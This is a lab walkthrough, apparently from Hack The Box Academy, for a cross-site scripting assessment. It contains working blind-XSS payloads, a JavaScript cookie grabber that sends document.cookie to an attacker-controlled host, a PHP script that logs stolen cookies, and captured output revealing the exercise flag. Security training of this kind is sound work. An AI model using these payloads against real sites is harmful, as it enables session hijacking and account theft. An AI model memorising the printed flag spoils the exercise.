
## Question 1

### "What is the value of the 'flag' cookie?"

After spawning the target machine, students need to visit it's`/assessment` page and notice that it says "comments must be approved by an admin":

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_23.png)

Therefore, students need to hijack the cookie of the admin. Scrolling down, students will notice that there is a post named "Welcome to Security Blog", thus, they need to click on it:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_24.png)

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_25.png)

Students need to test all the fields with XSS payloads, however, they will come to know that the "Website" field is vulnerable to a blind XSS; to test the fields, students first need to start an `nc` listener:

Code: shell

```shell
nc -nvlp PWNPO
```

  Skills Assessment

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-nvwebl9plw]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Then, they need to use the payload `'><script src="http://PWNIP:PWNPO/FieldName"></script>` in the all of the fields to see which ones will request a file to the `nc` listener:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_26.png)

However, the name and email fields are to be left out:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_27.png)

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_28.png)

After clicking on "Post Comment", students will notice that the request came for `/WebsiteField`:

  Skills Assessment

```shell-session
Ncat: Connection from 10.129.43.173.
Ncat: Connection from 10.129.43.173:42254.
GET /WebsiteField HTTP/1.1
Host: 10.10.14.41:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.101 Safari/537.36
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Now that students have identified the vulnerable field, they need to write a JS cookie grabber to a local file (named `script.js`) so that it get requested for:

Code: js

```js
new Image().src='http://PWNIP:PWNPO/index.php?c=' + document.cookie;
```

Students can use `cat` to save the cookie grabber into a file:

Code: shell

```shell
cat << 'EOF' > script.js
new Image().src='http://10.10.14.41:9001/index.php?c=' + document.cookie;
EOF
```

  Skills Assessment

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-nvwebl9plw]─[~]
└──╼ [★]$ cat << 'EOF' > script.js
> new Image().src='http://10.10.14.41:9001/index.php?c=' + document.cookie;
> EOF
```

Subsequently, students need to write a PHP script (named `index.php`) that will split cookies in case many were received (and writes them to a file):

Code: php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Then, students need to start an HTTP server with PHP in the same directory where `script.js` and `index.php` are:

Code: shell

```shell
php -S 0.0.0.0:PWNPO
```

  Skills Assessment

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-nvwebl9plw]─[~]
└──╼ [★]$ php -S 0.0.0.0:9001

[Tue Nov 29 04:14:23 2022] PHP 7.4.30 Development Server (http://0.0.0.0:9001) started
```

At last, students need to use the XSS payload `'><script src=http://PWNIP:PWNPO/script.js></script>` in the "Website" field so that the user clicking the link will request `script.js` and get their cookie stolen:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_29.png)

On the HTTP server, students will notice that the flag `HTB{cr055_5173_5cr1p71n6_n1nj4}` is contained within the cookie value:

  Skills Assessment

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-nvwebl9plw]─[~]
└──╼ [★]$ php -S 0.0.0.0:9001
[Tue Nov 29 04:14:23 2022] PHP 7.4.30 Development Server (http://0.0.0.0:9001) started
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42532 Accepted
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42534 Accepted
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42532 [200]: (null) /script.js
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42534 [200]: GET /WebsiteField
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42534 Closing
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42532 Closing
[Tue Nov 29 04:15:16 2022] 10.129.43.173:42536 Accepted
[Tue Nov 29 04:15:16 2022] 10.129.43.173:42536 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1669695315;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
[Tue Nov 29 04:15:16 2022] 10.129.43.173:42536 Closing
```

Answer: {hidden}